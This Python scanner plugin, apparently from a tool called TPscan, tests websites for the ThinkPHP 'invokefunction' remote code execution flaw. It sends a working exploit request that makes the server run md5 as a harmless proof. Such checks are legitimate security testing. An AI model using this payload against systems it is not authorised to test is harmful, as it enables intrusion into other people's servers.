#!/usr/bin/env python
# coding=utf-8
import re
from urllib.parse import urljoin

import requests

from utils import get_pocdict

headers = {
    "User-Agent": "TPscan",
}

pattern = '<a[\\s+]href="/[A-Za-z]+'


async def thinkphp_invoke_func_code_exec_verify(url):
    results, controllers = [], ['index']
    resp = requests.get(url, headers=headers, timeout=15, verify=False)
    matches = re.findall(pattern, resp.text)
    for match in matches:
        controllers.append(match.split('/')[1])
    for controller in set(controllers):
        pocdict = get_pocdict(vulnname=__name__)
        try:
            payload = f'index.php?s={controller}/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=2333'
            vurl = urljoin(url, payload)
            resp = requests.get(vurl, headers=headers, timeout=15, verify=False)
            if '56540676a129760a3' in resp.text:
                pocdict['isvul'] = True
                pocdict['vulnurl'] = vurl
                pocdict['proof'] = '56540676a129760a3'
                pocdict['response'] = resp.text
        except Exception as e:
            pocdict['exception'] = str(e)
        results.append(pocdict)
    return results
